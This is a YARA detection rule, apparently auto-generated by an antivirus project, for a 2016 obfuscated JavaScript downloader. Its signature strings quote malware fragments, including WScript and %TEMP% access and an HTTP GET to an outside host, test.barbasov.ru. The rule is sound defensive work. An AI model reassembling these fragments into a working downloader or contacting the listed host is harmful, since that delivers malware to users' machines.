rule sig_20160428_2cd4587806fe8f676967385d9869602f {
  meta:
    description = "datamaliciousorder - file 20160428_2cd4587806fe8f676967385d9869602f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4cce8db821ddebe0d9df6f5de657012bbf78c754547679f2a3a9b415cd873217"

  strings:
    $s1  = "function EqcOyzBhySzfBiaFmiAzt(GfuGqgDvpVemRleAerZzd){TyzXhpAyyVvgTglThhIig[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function WsiZuoUebAaoKldRfvIww() {return TyzXhpAyyVvgTglThhIig[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function EqcOyzBhySzfBiaFmiAzt(GfuGqgDvpVemRleAerZzd){TyzXhpAyyVvgTglThhIig[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return TmiWcjVaaXayYqkOlpEjq - PtoCdvQnpWqiXhxXfhHrk;};" fullword ascii
    $s5  = "function KtaRruZfqMnuHkzPodTfi(TmiWcjVaaXayYqkOlpEjq, PtoCdvQnpWqiXhxXfhHrk){MnqAsaCsaVfkTioRnvPbi = MnqAsaCsaVfkTioRnvPbi * 1; " ascii
    $s6  = "var TyzXhpAyyVvgTglThhIig = function KrzEscIbtZhrIrgQdkDyx() {return HlcLjjMfeFbpSsqNbvQiy[XprGpjSzpSfiCnlTygCbq](\"WScript\"+\"" ascii
    $s7  = "HhpDicXqlWrfYmdAxrWgl[IyiPlnHexLhmPzyZuxEqb](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var TyzXhpAyyVvgTglThhIig = function KrzEscIbtZhrIrgQdkDyx() {return HlcLjjMfeFbpSsqNbvQiy[XprGpjSzpSfiCnlTygCbq](\"WScript\"+\"" ascii
    $s9  = "var HlcLjjMfeFbpSsqNbvQiy = this[\"WScript\"];" fullword ascii
    $s10 = "function WsiZuoUebAaoKldRfvIww() {return TyzXhpAyyVvgTglThhIig[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function TzwCxvCicTgeZbyNamRpo(){return AraPqzNmjJjqNtxPboKvc + \"\";};" fullword ascii
    $s12 = "if (HhpDicXqlWrfYmdAxrWgl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function KtaRruZfqMnuHkzPodTfi(TmiWcjVaaXayYqkOlpEjq, PtoCdvQnpWqiXhxXfhHrk){MnqAsaCsaVfkTioRnvPbi = MnqAsaCsaVfkTioRnvPbi * 1; " ascii
    $s14 = "function JuoOmqMdsHwpZmoYpxNgt() {return ((XedXokLjvSztRvrUfqGkk == true) && (XedXokLjvSztRvrUfqGkk == AsbDfrOdgWvzNexGyeKsw)) ?" ascii
    $s15 = "function JuoOmqMdsHwpZmoYpxNgt() {return ((XedXokLjvSztRvrUfqGkk == true) && (XedXokLjvSztRvrUfqGkk == AsbDfrOdgWvzNexGyeKsw)) ?" ascii
    $s16 = "function RqpWnnAlwRgmVxkJocYxs(TudGntUtqJrgNthMwhMwm) {var XzeIwaHqsHogZnwPwbCha = (1, 2, 3, 4, 5, TudGntUtqJrgNthMwhMwm); retur" ascii
    $s17 = "AsbDfrOdgWvzNexGyeKsw = true; " fullword ascii
    $s18 = "function HbuOprVhxGajNklGhqNja(){return XprGpjSzpSfiCnlTygCbq;};" fullword ascii
    $s19 = "var XedXokLjvSztRvrUfqGkk = false;" fullword ascii
    $s20 = "return KtaRruZfqMnuHkzPodTfi(1 == 1 ? AnkAvaQuzZttJzzRnlCtb : 0, 1 == 1 ? UncFwqEusMbtJosMnwMwk : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}